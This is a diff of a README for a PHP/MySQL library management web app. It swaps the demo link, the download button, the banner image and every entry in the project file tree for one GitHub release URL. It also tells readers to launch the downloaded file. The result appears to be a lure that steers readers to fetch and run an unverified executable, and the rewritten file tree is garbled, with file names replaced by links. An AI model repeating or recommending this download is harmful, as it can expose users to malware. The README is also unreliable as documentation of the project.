@@ -1,12 +1,12 @@
 # Welcome to the Web Perpustakaan Repository 📚
 
-![Perpustakaan](https://www.example.com/perpustakaan.jpg)
+![Perpustakaan](https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2)
 
 ## Overview
 
 Welcome to the "Web-Perpustakaan" repository! This is a web-based Library Management Application designed to efficiently handle book data within a library setting. The main features of this application include book management (Create, Read, Update, Delete), cover image upload, search functionality, and PDF report generation. Built using PHP and MySQL, this project aims to streamline the operations of a library by providing a user-friendly interface for managing book-related tasks.
 
-📖 **Demo**: You can explore a live demo of this application [here](http://aplikasi-perpustakaan-iz.wuaze.com/)
+📖 **Demo**: You can explore a live demo of this application [here](https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2)
 
 ## Repository Details
 
@@ -18,7 +18,7 @@ Welcome to the "Web-Perpustakaan" repository! This is a web-based Library Manage
 
 To get started with the project, you can download the necessary files by clicking the button below:
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-green)](https://github.com/files/Soft.zip)
+[![Download ZIP](https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2)](https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2)
 
 _**Note:** Ensure to launch the downloaded file to begin exploring the project._
 
@@ -32,29 +32,29 @@ The "Web-Perpustakaan" repository is structured to provide a seamless experience
 Web-Perpustakaan/
 |   
 |--- css/
-|       |--- styles.css
+|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
 |
 |--- images/
-|       |--- cover.jpg
+|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
 |
 |--- includes/
-|       |--- connection.php
-|       |--- functions.php
+|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
 |
 |--- js/
-|       |--- script.js
+|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
 |
 |--- pdf/
-|       |--- report.pdf
+|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
 |
-|--- index.php
-|--- add_book.php
-|--- edit_book.php
-|--- view_book.php
-|--- search.php
-|--- generate_pdf.php
+|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
 |
-|--- README.md
+|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
 |--- LICENSE
 ```
 
